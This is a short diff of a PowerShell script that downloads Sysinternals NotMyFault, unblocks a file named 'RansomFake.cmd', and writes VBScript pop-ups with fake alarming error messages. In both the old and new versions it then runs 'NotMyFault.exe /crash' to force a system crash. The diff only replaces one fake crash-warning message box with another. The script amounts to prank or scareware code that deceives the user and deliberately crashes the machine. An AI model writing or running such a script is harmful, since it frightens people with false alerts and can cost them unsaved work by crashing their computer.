@@ -17,10 +17,12 @@ invoke-webrequest -Uri "https://release-assets.githubusercontent.com/github-prod
 invoke-webrequest -Uri "https://download.sysinternals.com/files/NotMyFault.zip" -OutFile "$env:temp"
 Unblock-File "RansomFake.cmd"
 Expand-Archive -Path "$home\AppData\Local\Temp\NotMyFault.zip" -DestinationPath "$home\AppData\Local\temp\B10HT6R3NO"
-echo "MsgBox "Windows is in crash state and the kernel is unavalabile!" ^& vbCrLf ,(0), "78ftc3sa9"" > corruption.vbs
-echo "MsgBox "turn off nowf avoiding any corruption!" ^& vbCrLf ,262192, "ctu4st6f"" > corruption.vbs 
+cd "$home\AppData\Local\Temp"
+echo "msgbox "Error 1S65HF5TY", 16+2+4096 , "Windows need to restart"" > nwork.vbs
+unblock-file "nwork.vbs"
 cd "$home\AppData\Local\Temp\B10HT6R3NO"
 NotMyFault.exe /crash
+
 
 
 
